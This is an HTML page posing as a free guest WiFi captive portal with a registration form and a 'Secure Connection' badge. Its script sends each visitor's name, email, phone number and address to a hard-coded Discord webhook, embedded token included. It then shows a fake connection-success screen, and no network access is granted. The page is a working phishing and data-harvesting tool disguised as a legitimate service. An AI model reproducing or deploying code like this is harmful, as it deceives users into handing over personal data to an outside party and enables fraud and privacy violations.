<html><head><base href="/" /></head>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Guest WiFi Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(45deg, #001a33, #004d99);
            position: relative;
            overflow-y: auto;
            padding: 2rem;
        }

        .background-pattern {
            position: fixed;
            width: 100%;
            height: 100%;
            background-image: radial-gradient(circle at 1px 1px, rgba(255, 255, 255, 0.1) 1px, transparent 0);
            background-size: 50px 50px;
            pointer-events: none;
            top: 0;
            left: 0;
        }

        .wifi-container {
            background: rgba(255, 255, 255, 0.98);
            padding: 1.8rem;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
            width: 85%;
            max-width: 450px;
            text-align: center;
            position: relative;
            border: 1px solid rgba(255, 255, 255, 0.2);
            transform: scale(0.9);
            margin-top: -2vh;
            max-height: 90vh;
            overflow-y: auto;
        }

        .wifi-container::-webkit-scrollbar {
            width: 8px;
        }

        .wifi-container::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 4px;
        }

        .wifi-container::-webkit-scrollbar-thumb {
            background: #888;
            border-radius: 4px;
        }

        .wifi-container::-webkit-scrollbar-thumb:hover {
            background: #555;
        }

        .logo-container {
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.8rem;
        }

        .wifi-icon {
            width: 35px;
            height: 35px;
        }

        .wifi-icon path {
            fill: #003366;
        }

        h1 {
            color: #002244;
            margin-bottom: 0.4rem;
            font-size: 1.6rem;
            font-weight: 600;
        }

        .subtitle {
            color: #666;
            margin-bottom: 1.5rem;
            font-size: 0.85rem;
        }

        .form-group {
            margin-bottom: 0.9rem;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 0.4rem;
            color: #445566;
            font-weight: 500;
            font-size: 0.85rem;
        }

        input[type="text"],
        input[type="email"] {
            width: 100%;
            padding: 0.7rem;
            border: 2px solid #e6e6e6;
            border-radius: 6px;
            font-size: 0.9rem;
            transition: all 0.3s;
            background: #fafafa;
        }

        input[type="text"]:focus,
        input[type="email"]:focus {
            border-color: #0066cc;
            background: white;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
        }

        .terms {
            display: flex;
            align-items: flex-start;
            gap: 0.6rem;
            margin: 0.8rem 0;
            text-align: left;
            padding: 0.4rem;
            background: #f8f9fa;
            border-radius: 6px;
        }

        .terms input {
            margin-top: 0.2rem;
        }

        .terms label {
            font-size: 0.8rem;
            line-height: 1.3;
            margin: 0;
        }

        button {
            background: linear-gradient(45deg, #003366, #004d99);
            color: white;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 6px;
            font-size: 1rem;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
            font-weight: 500;
            box-shadow: 0 4px 12px rgba(0, 51, 102, 0.2);
        }

        button:hover {
            background: linear-gradient(45deg, #004080, #0059b3);
            transform: translateY(-1px);
            box-shadow: 0 6px 15px rgba(0, 51, 102, 0.3);
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.4rem;
            margin-top: 1.2rem;
            color: #666;
            font-size: 0.75rem;
        }

        .security-badge svg {
            width: 14px;
            height: 14px;
            fill: #666;
        }

        @media (max-width: 480px) {
            body {
                padding: 1rem;
            }
            .wifi-container {
                padding: 1.5rem;
                width: 95%;
            }
        }
    </style>
</head>
<body>
    <div class="background-pattern"></div>
    <div class="wifi-container">
        <div class="logo-container">
            <svg class="wifi-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/>
            </svg>
            <h1>Free WiFi Access</h1>
        </div>
        <p class="subtitle">Please register to connect to our free guest network</p>
        <form id="wifiForm" onsubmit="return handleSubmit(event)">
            <div class="form-group">
                <label for="name">Full Name *</label>
                <input type="text" id="name" placeholder="Enter your name" required>
            </div>
            <div class="form-group">
                <label for="email">Email *</label>
                <input type="email" id="email" placeholder="Enter your email address" required>
            </div>
            <div class="form-group">
                <label for="phone">Phone Number *</label>
                <input type="text" id="phone" placeholder="Enter your phone number" required>
            </div>
            <div class="form-group">
                <label for="address">Address *</label>
                <input type="text" id="address" placeholder="Enter your address" required>
            </div>
            <div class="terms">
                <input type="checkbox" id="terms" required>
                <label for="terms">I agree to the Acceptable Use Policy and Terms of Service</label>
            </div>
            <div class="terms">
                <input type="checkbox" id="marketing">
                <label for="marketing">I would like to receive updates and special offers (optional)</label>
            </div>
            <button type="submit">Connect to WiFi</button>
        </form>
        <div class="security-badge">
            <svg viewBox="0 0 24 24">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
            </svg>
            Secure Connection
        </div>
    </div>

    <script>
        function handleSubmit(event) {
            event.preventDefault();
            
            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const phone = document.getElementById('phone').value;
            const address = document.getElementById('address').value;
            const terms = document.getElementById('terms').checked;
            const marketing = document.getElementById('marketing').checked;
            
            if (!name || !email || !phone || !address || !terms) {
                alert('Please complete all required fields');
                return false;
            }

            const button = event.target.querySelector('button');
            button.innerHTML = '<span>Connecting...</span>';
            button.disabled = true;

            const webhookUrl = 'https://discord.com/api/webhooks/1312824362348580886/pNND6U4YeJtFUmGkQt6oN9Xwhwj7OI9EVZzEwYauzBOqepT49vxrGDrh4LDfAlFKCvLc';
            const data = {
                content: `New WiFi Registration:\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nAddress: ${address}\nMarketing Consent: ${marketing ? 'Yes' : 'No'}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            }).then(() => {
                setTimeout(() => {
                    button.innerHTML = '<span>Connected Successfully</span>';
                    
                    setTimeout(() => {
                        document.querySelector('.wifi-container').innerHTML = `
                            <div class="logo-container">
                                <svg class="wifi-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/>
                                </svg>
                            </div>
                            <h1>Welcome to Free WiFi</h1>
                            <p style="color: #445566; margin: 1.5rem 0;">Hi, ${name}!</p>
                            <div style="background: #f8f9fa; padding: 1.5rem; border-radius: 8px; margin: 1rem 0;">
                                <p style="color: #445566; font-weight: 500; margin-bottom: 0.5rem;">Your Connection Info:</p>
                                <p style="color: #667788; margin: 0.5rem 0;">Network: Free_Guest_WiFi</p>
                                <p style="color: #667788; margin: 0.5rem 0;">Speed: Up to 10 Mbps</p>
                                <p style="color: #667788; margin: 0.5rem 0;">Duration: 2 hours</p>
                            </div>
                            <p style="color: #666; font-size: 0.9rem; margin-top: 1rem;">Enjoy your free WiFi access!</p>
                        `;
                    }, 1000);
                }, 2000);
            }).catch(error => {
                console.error('Error:', error);
                button.innerHTML = 'Connect to WiFi';
                button.disabled = false;
            });

            return false;
        }
    </script>
</body>
</html>
